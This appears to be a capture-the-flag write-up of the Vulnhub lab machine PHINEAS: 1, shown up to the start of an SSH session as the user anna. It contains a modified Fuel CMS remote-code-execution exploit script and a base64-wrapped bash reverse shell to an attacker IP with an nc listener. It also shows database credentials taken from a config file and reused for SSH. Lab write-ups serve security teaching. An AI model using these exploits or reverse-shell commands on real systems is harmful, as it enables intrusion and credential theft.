<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="PHINEAS: 1" /><meta name="author" content="am-a-circle" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://am-a-circle.github.io//posts/PHINEAS_1/" /><meta property="og:url" content="https://am-a-circle.github.io//posts/PHINEAS_1/" /><meta property="og:site_name" content="am-a-circle" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-01T20:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PHINEAS: 1" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@am-a-circle" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"am-a-circle"},"headline":"PHINEAS: 1","dateModified":"2021-12-24T21:45:16+08:00","datePublished":"2021-05-01T20:00:00+08:00","description":"Overview","url":"https://am-a-circle.github.io//posts/PHINEAS_1/","mainEntityOfPage":{"@type":"WebPage","@id":"https://am-a-circle.github.io//posts/PHINEAS_1/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>PHINEAS: 1 | am-a-circle</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="am-a-circle"><meta name="application-name" content="am-a-circle"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">am-a-circle</a></div><div class="site-subtitle font-italic">Logs of my roots.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/privesc/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>PRIVESC</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-a-circle" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>PHINEAS: 1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>PHINEAS: 1</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> am-a-circle </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 1, 2021, 8:00 PM +0800" >May 1, 2021<i class="unloaded">2021-05-01T20:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Dec 24, 2021, 9:45 PM +0800" >Dec 24, 2021<i class="unloaded">2021-12-24T21:45:16+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2598 words">14 min read</span></div></div><div class="post-content"><h2 id="overview">Overview</h2><p>Great box to practice enumeration, modifying public exploit to suit our needs and exploiting Python pickles.</p><div class="table-wrapper"><table><thead><tr><th>Box Difficulty<th>Link<tbody><tr><td>Easy-Medium<td><a href="https://www.vulnhub.com/entry/phineas-1,674/">Vulnhub Link</a></table></div><p>For this box I downloaded it off vulnhub and run it on my network.</p><h2 id="recon">Recon</h2><p>Let’s start begin with our standard pre-enumeration process to find out all the open ports.</p><p>This time let’s use nmap to find all open ports</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>└─# nmap <span class="nt">-p-</span> 192.168.1.29                                                 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-27 04:51 EDT
Nmap scan report <span class="k">for </span>phineas <span class="o">(</span>192.168.1.29<span class="o">)</span>
Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
3306/tcp open  mysql
MAC Address: 08:00:27:E3:69:7E <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>3.14 seconds                 
</pre></table></code></div></div><p>Now that we found that there are 4 open ports, let’s do a nmap to find more information about the service running.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>└─# nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 22,80,111,3306 192.168.1.29                                                                                                                     
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-27 04:53 EDT
Nmap scan report <span class="k">for </span>phineas <span class="o">(</span>192.168.1.29<span class="o">)</span>
Host is up <span class="o">(</span>0.00035s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 ac:d8:0a:a8:6a:1f:78:6d:ac:06:8f:65:3e:ff:9c:8b <span class="o">(</span>RSA<span class="o">)</span>
|   256 e7:f8:b0:07:1c:5b:4a:48:10:bc:f6:36:42:62:6c:e0 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c8:f0:ea:b8:bf:6b:a5:12:1f:9a:91:62:9d:1a:ce:75 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp  open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3306/tcp open  mysql   MariaDB <span class="o">(</span>unauthorized<span class="o">)</span>
MAC Address: 08:00:27:E3:69:7E <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>7.05 seconds

</pre></table></code></div></div><p>Really nothing much to work on. But let’s enumerate common ports more.</p><h2 id="mysql---tcp-3306">Mysql - TCP 3306</h2><p>Nothing much on port 3306 based on nmap scans.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>└─# nmap <span class="nt">-sV</span> <span class="nt">-p</span> 3306 <span class="nt">--script</span><span class="o">=</span><span class="s2">"banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)"</span> 192.168.1.29                                            
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-27 04:59 EDT                                                                                                           
Nmap scan report <span class="k">for </span>phineas <span class="o">(</span>192.168.1.29<span class="o">)</span>                                                                                                                               
Host is up <span class="o">(</span>0.00059s latency<span class="o">)</span><span class="nb">.</span>                                                                                                                                            
                                                                                                                                                                          
PORT     STATE SERVICE VERSION                                                                                                                                            
3306/tcp open  mysql   MariaDB <span class="o">(</span>unauthorized<span class="o">)</span>                                                                                                                             
| banner: ?<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>FFj<span class="se">\x</span>04Host <span class="s1">'kali'</span> is not allowed to connect to                                                                                                  
|_this MariaDB server
|_mysql-empty-password: Host <span class="s1">'kali'</span> is not allowed to connect to this MariaDB server
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_sslv2-drown: 
MAC Address: 08:00:27:E3:69:7E <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.75 seconds
</pre></table></code></div></div><h2 id="http--tcp-80">HTTP- TCP 80</h2><p>Running nikto doesn’t gives much information just that we know its running php and apache as it backend.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>└─# nikto <span class="nt">-ask</span><span class="o">=</span>no <span class="nt">-h</span> 192.168.1.29:80 2&gt;&amp;1
- Nikto v2.1.6
<span class="nt">---------------------------------------------------------------------------</span>
+ Target IP:          192.168.1.29
+ Target Hostname:    192.168.1.29
+ Target Port:        80
+ Start Time:         2021-04-27 05:01:25 <span class="o">(</span>GMT-4<span class="o">)</span>
<span class="nt">---------------------------------------------------------------------------</span>
+ Server: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
+ PHP/5.4.16 appears to be outdated <span class="o">(</span>current is at least 7.2.12<span class="o">)</span><span class="nb">.</span> PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release <span class="k">for </span>each branch.
+ Apache/2.4.6 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span><span class="nb">.</span> Apache 2.2.34 is the EOL <span class="k">for </span>the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 9 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+ End Time:           2021-04-27 05:02:29 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span>64 seconds<span class="o">)</span>
<span class="nt">---------------------------------------------------------------------------</span>
+ 1 host<span class="o">(</span>s<span class="o">)</span> tested
</pre></table></code></div></div><p>Thankful gobuster file enumeration shows that there is a “structure” folder found.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>└─# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.1.29 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-t</span> 100 <span class="nt">-e</span> <span class="nt">-k</span> <span class="nt">-s</span> <span class="s2">"200,204,301,302,307,403,500"</span> <span class="nt">-x</span> <span class="s2">"txt,html
,php,jsp"</span>                                                                             
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://192.168.1.29
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 100
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              txt,html,php,jsp
<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2021/04/30 13:26:59 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
http://192.168.1.29/structure            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 238] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.1.29/structure/]
</pre></table></code></div></div><p>Further enumeration of the “structure” folder reveals that there is a Fuel CMS running on the backend.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>└─# gobuster dir -u http://192.168.1.29/structure/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,jsp" 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.29/structure/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              jsp,txt,html,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/04/27 13:30:17 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.1.29/structure/assets               (Status: 301) [Size: 245] [--&gt; http://192.168.1.29/structure/assets/]
http://192.168.1.29/structure/robots.txt           (Status: 200) [Size: 30]                                             
http://192.168.1.29/structure/index.php            (Status: 200) [Size: 9288]                                           
http://192.168.1.29/structure/fuel                 (Status: 301) [Size: 243] [--&gt; http://192.168.1.29/structure/fuel/]
</pre></table></code></div></div><h2 id="shell-as-apache">Shell as Apache</h2><p>Searchsploit shows that there is a exploit available:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>└─# searchsploit fuel cms                                    
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                          |  Path
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
fuel CMS 1.4.1 - Remote Code Execution <span class="o">(</span>1<span class="o">)</span>                                                                                              | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution <span class="o">(</span>2<span class="o">)</span>                                                                                              | php/webapps/49487.rb
Fuel CMS 1.4.7 - <span class="s1">'col'</span> SQL Injection <span class="o">(</span>Authenticated<span class="o">)</span>                                                                                    | php/webapps/48741.txt
Fuel CMS 1.4.8 - <span class="s1">'fuel_replace_id'</span> SQL Injection <span class="o">(</span>Authenticated<span class="o">)</span>                                                                        | php/webapps/48778.txt
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</pre></table></code></div></div><p>After downloading the exploit, modify the exploit file to suit our need.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">" http://192.168.1.29/structure/"</span>
<span class="k">def</span> <span class="nf">find_nth_overlapping</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">needle</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">)</span>
    <span class="k">while</span> <span class="n">start</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">,</span> <span class="n">start</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">n</span> <span class="o">-=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">start</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">xxxx</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'cmd:'</span><span class="p">)</span>
        <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s">"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"</span><span class="o">+</span><span class="n">urllib</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">xxxx</span><span class="p">)</span><span class="o">+</span><span class="s">"%27%29%2&gt;
        #proxy = {"</span><span class="n">http</span><span class="s">":"</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span><span class="s">"}
        r = requests.get(burp0_url)

        html = "</span><span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span><span class="s">"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print r.text[0:dup]
</span></pre></table></code></div></div><p>Run the exploit and command to see who we are and what we can do!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>└─# python 47138.py                                                                                                                                                       
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python co
re team. Support <span class="k">for </span>it is now deprecated <span class="k">in </span>cryptography, and will be removed <span class="k">in </span>a future release.                                                                       
cmd:id                                                                                                                                                                    
<span class="nv">systemuid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0   

cmd:which <span class="nb">awk </span>perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp php 2&gt;/dev/null                                                                    
system/usr/bin/awk                                                                   
/usr/bin/perl                                                                                                                                                             
/usr/bin/python                      
/usr/bin/python3                                                                     
/usr/bin/ruby
/usr/bin/vi
/usr/bin/vim
/usr/bin/find
/usr/bin/nc
/usr/bin/wget
/usr/bin/php                
</pre></table></code></div></div><p>Something i like to do is base64 encode and decode then pipe to bash for reverse shell:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.1.152/4444 0&gt;&amp;1  <span class="c"># Base64 encode this</span>
  
<span class="nb">echo </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTUyLzQ0NDQgMD4mMQ<span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</pre></table></code></div></div><p>Running the exploit:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>python 47138.py

cmd:echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTUyLzQ0NDQgMD4mMQ<span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</pre></table></code></div></div><p>On our attacking machine :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>└─# nc <span class="nt">-lvnp</span> 4444                                                                                                                                                     
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>192.168.1.152] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.1.29] 58334
bash: no job control <span class="k">in </span>this shell
bash-4.2<span class="nv">$ </span><span class="nb">whoami
whoami
</span>apache
bash-4.2<span class="nv">$ </span><span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">id
hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">id
</span>phineas
apache
<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
bash-4.2<span class="nv">$ </span>
</pre></table></code></div></div><p>Great! Shell as apache!</p><h2 id="shell-as-anna">Shell as anna</h2><p>Whenever there is a web CMS installed, sometimes it’s best to look through the configuration file for password reuse attacks.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>bash-4.2<span class="nv">$ </span><span class="nb">pwd                                                                                                                                                             
pwd</span>                                                                                                                                                                       
/var/www/html/structure/fuel/application/config                                                                                                                           
bash-4.2<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>                                                                                                                                                                                                                                                                                                                          
....
....                                                                                                                                                                                                                                                   
<span class="nt">-rwxr-xr-x</span><span class="nb">.</span>  1 apache apache  4647 Apr  1 04:22 database.php                                                                                                            
....
.... 
bash-4.2<span class="nv">$ </span><span class="nb">cat </span>database.php
....
....
<span class="nv">$db</span><span class="o">[</span><span class="s1">'default'</span><span class="o">]</span> <span class="o">=</span> array<span class="o">(</span>
        <span class="s1">'dsn'</span>   <span class="o">=&gt;</span> <span class="s1">''</span>,
        <span class="s1">'hostname'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,
        <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'anna'</span>,
        <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'H993hfkNNid5kk'</span>,
        <span class="s1">'database'</span> <span class="o">=&gt;</span> <span class="s1">'anna'</span>,
...
....
</pre></table></code></div></div><p>Having a username and password, let us SSH into the machine as anna.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>ssh anna@192.168.1.29
anna@192.168.1.29<span class="s1">'s password: 
[anna@phineas ~]$ whoami &amp;&amp; id &amp;&amp; hostname
anna
